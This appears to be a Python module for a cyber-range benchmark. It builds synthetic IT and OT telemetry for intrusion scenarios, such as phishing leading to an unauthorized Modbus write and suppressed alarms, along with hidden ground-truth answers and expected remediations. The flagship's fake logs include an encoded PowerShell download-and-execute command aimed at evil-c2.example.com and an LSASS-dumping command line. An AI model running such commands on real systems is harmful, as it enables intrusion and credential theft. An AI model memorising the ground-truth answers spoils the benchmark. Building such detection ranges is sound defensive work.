"""Cyber range (§53, §54, §55).

Generates synthetic IT + OT telemetry for attack scenarios. Every scenario
has hidden ground truth (§56) — the agent never sees it; the benchmark
verifies the agent's reconstruction against it.

The flagship scenario is the IT→OT intrusion described in §84.
"""
from __future__ import annotations

import uuid
from datetime import datetime, timedelta, timezone
from typing import Any

from sqlalchemy.ext.asyncio import AsyncSession

from ..models import Scenario, Asset, OTAsset, AssetRelationship


def _ts(base: datetime, offset_seconds: int) -> datetime:
    return base + timedelta(seconds=offset_seconds)


# --------------------------------------------------------------------------- #
# Asset registry for the cyber range
# --------------------------------------------------------------------------- #

def build_enterprise_assets() -> dict[str, Asset]:
    """Build the IT asset set for the cyber range."""
    out: dict[str, Asset] = {}
    specs = [
        ("DC-01", "Domain Controller 01", "host", "10.10.1.10",
         "corporate", "high"),
        ("WEB-01", "Web Server 01", "host", "10.10.1.20",
         "corporate", "medium"),
        ("FILE-01", "File Server 01", "host", "10.10.1.30",
         "corporate", "medium"),
        ("WS-01", "Workstation 01 (laptop)", "host", "10.10.1.50",
         "corporate", "low"),
        ("WS-02", "Workstation 02 (laptop)", "host", "10.10.1.51",
         "corporate", "low"),
        ("VPN-01", "VPN Gateway", "host", "10.10.1.100",
         "corporate", "high"),
        ("EWS-01", "Engineering Workstation 01", "host", "10.20.1.10",
         "supervisory", "safety_critical"),
        ("SCADA-01", "SCADA Server 01", "host", "10.20.1.20",
         "supervisory", "safety_critical"),
        ("HMI-01", "HMI 01", "host", "10.20.1.30",
         "supervisory", "high"),
        ("HIST-01", "Historian 01", "host", "10.20.1.40",
         "supervisory", "high"),
        ("PLC-01", "PLC 01", "plc", "10.30.1.1", "control", "safety_critical"),
        ("PLC-02", "PLC 02", "plc", "10.30.1.2", "control", "safety_critical"),
        ("PLC-07", "PLC 07", "plc", "10.30.1.7", "control", "high"),
        ("U-alice", "Alice Chen", "user", None, "corporate", "low"),
        ("U-bob", "Bob Smith", "user", None, "corporate", "low"),
        ("U-engineer", "Engineering Account", "user", None,
         "supervisory", "high"),
    ]
    for aid, name, kind, ip, zone, crit in specs:
        out[aid] = Asset(
            id=aid, name=name, kind=kind,
            hostname=aid if kind != "user" else None,
            ipAddress=ip, zone=zone, criticality=crit,
            attributes={"ot_type": "engineering_workstation"} if aid == "EWS-01" else
                        ({"ot_type": "plc"} if aid.startswith("PLC-") else
                         ({"ot_type": "scada"} if aid == "SCADA-01" else
                          ({"ot_type": "hmi"} if aid == "HMI-01" else
                           ({"ot_type": "historian"} if aid == "HIST-01" else {})))),
        )
    return out


def build_enterprise_relationships() -> list[AssetRelationship]:
    """Static asset relationships for the cyber range."""
    rels = [
        ("VPN-01", "DC-01", "communicates_with"),
        ("EWS-01", "PLC-01", "controls"),
        ("EWS-01", "PLC-02", "controls"),
        ("EWS-01", "PLC-07", "controls"),
        ("SCADA-01", "PLC-01", "controls"),
        ("SCADA-01", "PLC-02", "controls"),
        ("SCADA-01", "PLC-07", "controls"),
        ("HMI-01", "SCADA-01", "monitored_by"),
        ("HMI-01", "PLC-01", "communicates_with"),
        ("HMI-01", "PLC-02", "communicates_with"),
        ("HIST-01", "SCADA-01", "monitored_by"),
        ("WS-01", "DC-01", "authenticated_to"),
        ("WS-02", "DC-01", "authenticated_to"),
    ]
    return [
        AssetRelationship(
            id=f"AR-{uuid.uuid4().hex[:8].upper()}",
            srcAssetId=src, dstAssetId=dst, relation=rel,
            confidence=1.0, attributes={},
        )
        for src, dst, rel in rels
    ]


def build_ot_assets() -> list[OTAsset]:
    """Build OT-specific extensions for the OT assets."""
    out: list[OTAsset] = []
    for aid, ot_type, protocol, safety, proc in (
        ("EWS-01", "engineering_workstation", None, "serious", "Reactor-A"),
        ("SCADA-01", "scada_server", "modbus", "serious", "Reactor-A"),
        ("HMI-01", "hmi", "modbus", "serious", "Reactor-A"),
        ("HIST-01", "historian", "modbus", "minor", "Reactor-A"),
        ("PLC-01", "plc", "modbus", "catastrophic", "Reactor-A"),
        ("PLC-02", "plc", "modbus", "catastrophic", "Reactor-B"),
        ("PLC-07", "plc", "modbus", "serious", "Reactor-G"),
    ):
        out.append(OTAsset(
            id=f"OTA-{aid}", assetId=aid, otType=ot_type, protocol=protocol,
            vendor="SimVendor", firmware="1.2.3",
            physicalProcess=proc, safetyImpact=safety,
            processVariables={},
        ))
    return out


# --------------------------------------------------------------------------- #
# Threat intel fixtures
# --------------------------------------------------------------------------- #

def build_threat_intel() -> list[dict[str, Any]]:
    return [
        {
            "indicator": "evil-c2.example.com",
            "indicator_type": "ioc_domain",
            "confidence": 0.7,
            "attributes": {"newly_registered": True},
            "attack_techniques": ["T1071.004"],
            "source": "synthetic",
        },
        {
            "indicator": "198.51.100.7",
            "indicator_type": "ioc_ip",
            "confidence": 0.6,
            "attack_techniques": ["T1071.001"],
            "source": "synthetic",
        },
    ]


# --------------------------------------------------------------------------- #
# Flagship IT→OT attack scenario (§84)
# --------------------------------------------------------------------------- #

def flagship_scenario() -> dict[str, Any]:
    """Build the flagship IT→OT attack scenario per §84, §85-93 demo moments.

    Timeline:
    t=0    : User Alice receives phishing email on WS-01
    t=30   : Alice clicks link, dropper runs encoded PowerShell
    t=45   : PowerShell downloads from evil-c2.example.com
    t=120  : Attacker dumps LSASS credentials on WS-01
    t=200  : Attacker uses stolen creds to authenticate to VPN as Alice
    t=300  : Attacker pivots to EWS-01 via SMB, authenticates as Alice
    t=420  : On EWS-01, attacker launches engineering software (TIA-style)
    t=540  : Attacker issues Modbus write to PLC-07
    t=540  : PLC-07 process variable deviates outside expected range
    t=545  : Alarm suppressed (inhibit response function)
    t=600  : Process temperature continues to deviate

    Ground truth stored separately; agent must reconstruct it from telemetry.
    """
    base = datetime(2025, 9, 4, 14, 0, 0, tzinfo=timezone.utc)
    telemetry: list[dict[str, Any]] = []
    ev_id = 0
    def _id() -> str:
        nonlocal ev_id
        ev_id += 1
        return f"R-EVT-{ev_id:04d}"

    # Phishing arrival (email).
    telemetry.append({
        "id": _id(), "source": "email_gateway", "timestamp": _ts(base, 0).isoformat(),
        "host": "WS-01", "user": "alice",
        "normalized_data": {
            "event_kind": "email_click", "domain": "endpoint",
            "subject": "Reactor-A Maintenance Schedule Update",
            "url": "https://evil-c2.example.com/dropper",
            "verdict": "allowed",
            "user": "alice", "host": "WS-01",
        },
    })
    # PowerShell exec (sysmon EID 1).
    telemetry.append({
        "id": _id(), "source": "sysmon", "event_id": 1,
        "timestamp": _ts(base, 30).isoformat(),
        "host": "WS-01", "user": "CORP\\alice",
        "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "normalized_data": {
            "event_kind": "process_exec", "domain": "endpoint",
            "image": "powershell.exe",
            "command_line": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBlAHYAaQBsAC0AYwAyAC4AZQB4AGEAbQBwAGwAZQAuAGMAbwBtAC8AZAByAG8AcABwAGUAcgAnACkA",
            "encoded": True, "user": "alice", "host": "WS-01",
        },
    })
    # DNS resolution to evil-c2.example.com.
    telemetry.append({
        "id": _id(), "source": "zeek", "log_type": "dns",
        "timestamp": _ts(base, 45).isoformat(),
        "src_ip": "10.10.1.50", "query": "evil-c2.example.com",
        "normalized_data": {
            "event_kind": "dns", "domain": "network",
            "src_ip": "10.10.1.50", "query": "evil-c2.example.com",
        },
    })
    # Network connection to evil-c2.example.com (HTTP download).
    telemetry.append({
        "id": _id(), "source": "zeek", "log_type": "conn",
        "timestamp": _ts(base, 45).isoformat(),
        "src_ip": "10.10.1.50", "dst_ip": "198.51.100.7",
        "dst_port": 443, "proto": "tcp",
        "normalized_data": {
            "event_kind": "flow", "domain": "network",
            "src_ip": "10.10.1.50", "dst_ip": "198.51.100.7",
            "dst_port": 443, "proto": "tcp",
        },
    })
    # LSASS access (sysmon EID 10).
    telemetry.append({
        "id": _id(), "source": "sysmon", "event_id": 10,
        "timestamp": _ts(base, 120).isoformat(),
        "host": "WS-01", "user": "CORP\\alice",
        "image": "C:\\Users\\alice\\AppData\\Local\\Temp\\dropper.exe",
        "target_image": "C:\\Windows\\System32\\lsass.exe",
        "normalized_data": {
            "event_kind": "process_access", "domain": "endpoint",
            "image": "dropper.exe", "target_image": "lsass.exe",
            "granted_access": "0x1410", "user": "alice", "host": "WS-01",
            "command_line": "dropper.exe --dump-lsass",
        },
    })
    # VPN authentication as Alice.
    telemetry.append({
        "id": _id(), "source": "vpn_log", "timestamp": _ts(base, 200).isoformat(),
        "user": "alice", "host": "VPN-01",
        "normalized_data": {
            "event_kind": "auth_event", "domain": "identity",
            "outcome": "success", "user": "alice", "logon_type": "vpn",
            "source_ip": "198.51.100.7", "host": "VPN-01",
        },
    })
    # Lateral auth to EWS-01 via SMB.
    telemetry.append({
        "id": _id(), "source": "windows_event_log", "event_id": 4624,
        "timestamp": _ts(base, 300).isoformat(),
        "user": "CORP\\alice", "host": "EWS-01",
        "normalized_data": {
            "event_kind": "auth_event", "domain": "identity",
            "outcome": "success", "user": "alice", "logon_type": 3,
            "source_ip": "10.10.1.50", "host": "EWS-01",
        },
    })
    # SMB connection WS-01 → EWS-01.
    telemetry.append({
        "id": _id(), "source": "zeek", "log_type": "conn",
        "timestamp": _ts(base, 300).isoformat(),
        "src_ip": "10.10.1.50", "dst_ip": "10.20.1.10",
        "dst_port": 445, "proto": "tcp",
        "normalized_data": {
            "event_kind": "flow", "domain": "network",
            "src_ip": "10.10.1.50", "dst_ip": "10.20.1.10",
            "dst_port": 445, "proto": "tcp",
        },
    })
    # Service creation on EWS-01 (persistence).
    telemetry.append({
        "id": _id(), "source": "windows_event_log", "event_id": 7045,
        "timestamp": _ts(base, 310).isoformat(),
        "user": "CORP\\alice", "host": "EWS-01",
        "normalized_data": {
            "event_kind": "service_create", "domain": "persistence",
            "service_name": "EngineerHelper",
            "service_path": "C:\\Users\\Public\\svc.exe",
            "user": "alice", "host": "EWS-01",
        },
    })
    # Engineering software launch on EWS-01.
    telemetry.append({
        "id": _id(), "source": "sysmon", "event_id": 1,
        "timestamp": _ts(base, 420).isoformat(),
        "host": "EWS-01", "user": "CORP\\alice",
        "image": "C:\\Program Files\\Vendor\\EngineeringSuite\\eng.exe",
        "normalized_data": {
            "event_kind": "process_exec", "domain": "endpoint",
            "image": "eng.exe", "command_line": "eng.exe --plc PLC-07",
            "encoded": False, "user": "alice", "host": "EWS-01",
        },
    })
    # Modbus write to PLC-07.
    telemetry.append({
        "id": _id(), "source": "ot:modbus", "protocol": "modbus",
        "timestamp": _ts(base, 540).isoformat(),
        "src_device": "EWS-01", "dst_device": "PLC-07",
        "function": "write_single_register",
        "normalized_data": {
            "event_kind": "plc_write", "domain": "ot",
            "protocol": "modbus", "src_device": "EWS-01",
            "dst_device": "PLC-07", "register": 40001, "value": 75,
            "authorized": False, "function": "write_single_register",
        },
    })
    # Process variable deviation.
    telemetry.append({
        "id": _id(), "source": "process_variable",
        "timestamp": _ts(base, 540).isoformat(),
        "asset": "PLC-07", "variable": "Reactor-Temp",
        "normalized_data": {
            "event_kind": "process_var_change", "domain": "process",
            "asset": "PLC-07", "variable": "Reactor-Temp",
            "value": 92.0, "expected_min": 60.0, "expected_max": 80.0,
            "deviation": "high",
        },
    })
    # Alarm suppressed (inhibit response function).
    telemetry.append({
        "id": _id(), "source": "alarm_system",
        "timestamp": _ts(base, 545).isoformat(),
        "asset": "PLC-07",
        "normalized_data": {
            "event_kind": "alarm_event", "domain": "safety",
            "alarm_id": "T-HIGH-7", "suppressed": True,
            "asset": "PLC-07", "suppressed_by": "EWS-01",
        },
    })
    # Benign maintenance window the agent should discover as counter-evidence.
    telemetry.append({
        "id": _id(), "source": "maintenance_log",
        "timestamp": _ts(base, 480).isoformat(),
        "normalized_data": {
            "event_kind": "maintenance_window", "domain": "ot",
            "asset": "PLC-07", "scheduled": False,
            "engineer": "alice",
        },
    })

    # NOTE: the maintenance_log entry has scheduled=False — meaning the
    # maintenance was NOT authorized. The agent must reason about this
    # rather than blindly accepting the log entry as benign.

    ground_truth = {
        "attack_start": _ts(base, 0).isoformat(),
        "attack_end": _ts(base, 545).isoformat(),
        "attacker_identity": "unknown_external",
        "compromised_identity": "alice",
        "affected_assets": ["WS-01", "VPN-01", "EWS-01", "PLC-07"],
        "techniques": [
            "T1566.001",  # Spearphishing Attachment / Link
            "T1059.001",  # PowerShell
            "T1003.001",  # LSASS Memory
            "T1078.002",  # Domain Accounts (valid account use)
            "T1021.002",  # SMB/Admin Shares
            "T1543.003",  # Create or Modify System Process: Windows Service (EID 7045)
            "T0855",      # ICS Unauthorized Command Message (rogue Modbus write)
            "T0836",      # ICS Modify Parameter (register 40001 setpoint changed)
            "T0831",      # ICS Manipulation of Control (process variable driven out of range)
            "T0878",      # ICS Alarm Suppression (T-HIGH-7 suppressed)
        ],
        "stages": [
            {"stage": "initial_access", "ts": _ts(base, 0).isoformat(),
             "asset": "WS-01", "user": "alice"},
            {"stage": "execution", "ts": _ts(base, 30).isoformat(),
             "asset": "WS-01", "user": "alice"},
            {"stage": "credential_access", "ts": _ts(base, 120).isoformat(),
             "asset": "WS-01", "user": "alice"},
            {"stage": "lateral_movement", "ts": _ts(base, 300).isoformat(),
             "asset": "EWS-01", "user": "alice"},
            {"stage": "persistence", "ts": _ts(base, 310).isoformat(),
             "asset": "EWS-01", "user": "alice"},
            {"stage": "ot_access", "ts": _ts(base, 420).isoformat(),
             "asset": "EWS-01", "user": "alice"},
            {"stage": "ot_manipulation", "ts": _ts(base, 540).isoformat(),
             "asset": "PLC-07", "user": "alice"},
            {"stage": "process_impact", "ts": _ts(base, 540).isoformat(),
             "asset": "PLC-07", "user": "alice"},
        ],
        "impact": {
            "physical_consequence": "potential_reactor_temperature_exceedance",
            "safety_consequence": "alarm_suppressed_inhibit_response_function",
            "business_consequence": "reactor_shutdown_required",
        },
        "expected_remediation": [
            "isolate WS-01 (after verifying non-OT)",
            "disable alice account",
            "rotate alice credentials",
            "block evil-c2.example.com at egress",
            "do NOT automatically isolate EWS-01 (OT engineering review required)",
            "do NOT automatically isolate PLC-07 (process-owner approval required)",
            "deploy Sigma rule for the encoded PowerShell pattern",
        ],
        "false_positive_traps": [],
    }
    return {
        "name": "Flagship IT→OT Intrusion",
        "scope": "hybrid",
        "difficulty": "hard",
        "description": (
            "Phishing → PowerShell → LSASS → VPN → SMB → EWS-01 → Modbus → "
            "process variable deviation → alarm suppression. Full chain from "
            "initial access to OT impact. §84 flagship demo."
        ),
        "scenario_seed": 1,
        "ground_truth": ground_truth,
        "telemetry": telemetry,
    }


# --------------------------------------------------------------------------- #
# Additional scenarios (§55)
# --------------------------------------------------------------------------- #

def brute_force_scenario() -> dict[str, Any]:
    """Brute force authentication scenario."""
    base = datetime(2025, 9, 4, 14, 0, 0, tzinfo=timezone.utc)
    telemetry: list[dict[str, Any]] = []
    for i in range(20):
        telemetry.append({
            "id": f"R-EVT-BF-{i:04d}", "source": "windows_event_log",
            "event_id": 4625,
            "timestamp": _ts(base, i * 2).isoformat(),
            "host": "DC-01", "user": "admin",
            "normalized_data": {
                "event_kind": "auth_event", "domain": "identity",
                "outcome": "failure", "user": "admin", "count": i + 1,
                "source_ip": "198.51.100.7", "host": "DC-01",
            },
        })
    telemetry.append({
        "id": "R-EVT-BF-SUCCESS", "source": "windows_event_log",
        "event_id": 4624,
        "timestamp": _ts(base, 45).isoformat(),
        "host": "DC-01", "user": "admin",
        "normalized_data": {
            "event_kind": "auth_event", "domain": "identity",
            "outcome": "success", "user": "admin",
            "source_ip": "198.51.100.7", "host": "DC-01",
        },
    })
    return {
        "name": "Brute Force Authentication",
        "scope": "enterprise",
        "difficulty": "easy",
        "description": "Multiple failed authentications followed by success.",
        "scenario_seed": 2,
        "ground_truth": {
            "attack_start": _ts(base, 0).isoformat(),
            "attack_end": _ts(base, 45).isoformat(),
            "attacker_identity": "external_brute_forcer",
            "compromised_identity": "admin",
            "affected_assets": ["DC-01"],
            "techniques": ["T1110", "T1078"],
            "stages": [
                {"stage": "credential_access", "ts": _ts(base, 0).isoformat(),
                 "asset": "DC-01", "user": "admin"},
                {"stage": "valid_account_use", "ts": _ts(base, 45).isoformat(),
                 "asset": "DC-01", "user": "admin"},
            ],
            "impact": {"physical_consequence": None,
                       "safety_consequence": None,
                       "business_consequence": "domain_administrative_compromise"},
            "expected_remediation": ["disable admin account", "rotate credentials", "block source IP"],
            "false_positive_traps": [],
        },
        "telemetry": telemetry,
    }


def false_positive_scenario() -> dict[str, Any]:
    """Legitimate admin activity that looks like an attack (§55: false positive)."""
    base = datetime(2025, 9, 4, 14, 0, 0, tzinfo=timezone.utc)
    telemetry: list[dict[str, Any]] = []
    # Same PowerShell exec — but with a change ticket.
    telemetry.append({
        "id": "R-EVT-FP-1", "source": "sysmon", "event_id": 1,
        "timestamp": _ts(base, 0).isoformat(),
        "host": "EWS-01", "user": "CORP\\ot-engineer",
        "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "normalized_data": {
            "event_kind": "process_exec", "domain": "endpoint",
            "image": "powershell.exe",
            "command_line": "powershell.exe -enc ...maintenance-script...",
            "encoded": True, "user": "ot-engineer", "host": "EWS-01",
            "change_ticket": "CHG-2025-09-04-001",
        },
    })
    telemetry.append({
        "id": "R-EVT-FP-2", "source": "change_management",
        "timestamp": _ts(base, -3600).isoformat(),
        "user": "ot-engineer",
        "normalized_data": {
            "event_kind": "change_ticket", "domain": "identity",
            "ticket_id": "CHG-2025-09-04-001",
            "approver": "ot-lead", "user": "ot-engineer",
            "window_start": _ts(base, 0).isoformat(),
            "window_end": _ts(base, 3600).isoformat(),
            "host": "EWS-01",
        },
    })
    return {
        "name": "False Positive: Legitimate Maintenance",
        "scope": "enterprise",
        "difficulty": "medium",
        "description": "Authorized engineer runs encoded PowerShell during a scheduled maintenance window.",
        "scenario_seed": 3,
        "ground_truth": {
            "attack_start": None,
            "attack_end": None,
            "attacker_identity": None,
            "compromised_identity": None,
            "affected_assets": [],
            "techniques": [],
            "stages": [],
            "impact": {},
            "expected_remediation": [],
            "false_positive_traps": [
                {"description": "Encoded PowerShell from ot-engineer during maintenance window",
                 "expected_classification": "benign"}
            ],
        },
        "telemetry": telemetry,
    }


def silent_compromise_scenario() -> dict[str, Any]:
    """Silent compromise — no obvious alert, requires hunting (§55: silent compromise)."""
    base = datetime(2025, 9, 4, 14, 0, 0, tzinfo=timezone.utc)
    telemetry: list[dict[str, Any]] = []
    # Only a few subtle beacons.
    for i in range(5):
        telemetry.append({
            "id": f"R-EVT-SC-{i:04d}", "source": "zeek", "log_type": "conn",
            "timestamp": _ts(base, i * 600).isoformat(),
            "src_ip": "10.10.1.50", "dst_ip": "198.51.100.7",
            "dst_port": 443, "proto": "tcp",
            "normalized_data": {
                "event_kind": "flow", "domain": "network",
                "src_ip": "10.10.1.50", "dst_ip": "198.51.100.7",
                "dst_port": 443, "proto": "tcp", "duration_ms": 50,
            },
        })
    return {
        "name": "Silent Compromise (Beaconing)",
        "scope": "enterprise",
        "difficulty": "hard",
        "description": "Subtle periodic beacons to a C2 IP. No initial alert.",
        "scenario_seed": 4,
        "ground_truth": {
            "attack_start": _ts(base, 0).isoformat(),
            "attack_end": _ts(base, 2400).isoformat(),
            "attacker_identity": "unknown_external",
            "compromised_identity": None,
            "affected_assets": ["WS-01"],
            "techniques": ["T1071.001"],
            "stages": [{"stage": "command_and_control", "ts": _ts(base, 0).isoformat(),
                        "asset": "WS-01", "user": "alice"}],
            "impact": {},
            "expected_remediation": ["block 198.51.100.7", "isolate WS-01"],
            "false_positive_traps": [],
        },
        "telemetry": telemetry,
    }


ALL_SCENARIOS = {
    "flagship": flagship_scenario,
    "brute_force": brute_force_scenario,
    "false_positive": false_positive_scenario,
    "silent_compromise": silent_compromise_scenario,
}


async def load_scenario_into_db(session: AsyncSession, scenario_id: str) -> Scenario:
    """Persist a scenario to the DB with its telemetry fixtures and ground truth."""
    builder = ALL_SCENARIOS.get(scenario_id)
    if not builder:
        raise ValueError(f"unknown scenario: {scenario_id}")
    spec = builder()
    # Persist assets if not already.
    assets = build_enterprise_assets()
    for a in assets.values():
        existing = await session.get(Asset, a.id)
        if not existing:
            session.add(a)
    for ar in build_enterprise_relationships():
        session.add(ar)
    for ota in build_ot_assets():
        existing = await session.get(OTAsset, ota.id)
        if not existing:
            session.add(ota)
    scenario = Scenario(
        id=f"SCN-{uuid.uuid4().hex[:10].upper()}",
        name=spec["name"], scope=spec["scope"], difficulty=spec["difficulty"],
        description=spec["description"], scenarioSeed=spec["scenario_seed"],
        groundTruth=spec["ground_truth"],
        assets={aid: {"kind": a.kind, "name": a.name, "zone": a.zone,
                      "criticality": a.criticality}
                for aid, a in assets.items()},
        telemetry=spec["telemetry"],
    )
    session.add(scenario)
    await session.flush()
    return scenario


def get_scenario_telemetry_state(scenario: Scenario) -> dict[str, Any]:
    """Build the agent ctx_state dictionary for a given scenario."""
    assets_dict: dict[str, dict[str, Any]] = {}
    for aid, a in scenario.assets.items():
        assets_dict[aid] = {
            "id": aid, "name": a["name"], "kind": a["kind"], "zone": a["zone"],
            "hostname": aid if a["kind"] != "user" else None,
            # Assets without a stored criticality fall back to "high"
            # (conservative).
            "criticality": a.get("criticality", "high"),
        }
    # Enrich OT assets with OT-specific attributes.
    for ot_id in ("EWS-01", "SCADA-01", "HMI-01", "HIST-01", "PLC-01", "PLC-02", "PLC-07"):
        if ot_id in assets_dict:
            assets_dict[ot_id]["criticality"] = "safety_critical"
            assets_dict[ot_id]["safety_classification"] = "critical"
            assets_dict[ot_id]["kind"] = (
                "engineering_workstation" if ot_id == "EWS-01" else
                "scada_server" if ot_id == "SCADA-01" else
                "hmi" if ot_id == "HMI-01" else
                "historian" if ot_id == "HIST-01" else "plc")
            assets_dict[ot_id]["dependencies"] = {}
            if ot_id in {"EWS-01", "SCADA-01"}:
                assets_dict[ot_id]["dependencies"]["controls"] = ["PLC-01", "PLC-02", "PLC-07"]
                assets_dict[ot_id]["dependencies"]["monitored_by"] = ["HMI-01"]
    return {
        "telemetry": list(scenario.telemetry),
        "threat_intel": build_threat_intel(),
        "assets": assets_dict,
        "memory_available": {"EWS-01": False, "WS-01": True, "DC-01": True},
        "active_sessions": {"alice": ["VPN-01"], "admin": ["DC-01"]},
        "isolated_hosts": set(),
        "disabled_accounts": set(),
        "rotated_credentials": set(),
        "blocked_iocs": set(),
        "deployed_sigma_rules": {},
        "deployed_yara_rules": {},
        "plc_state": {},
        "registry_artifacts": [],
        "prefetch": [],
        "amcache": [],
        "plaso_timeline": [],
        "filesystem_artifacts": [],
        "synthetic": True,
        "executed_actions": [],
    }
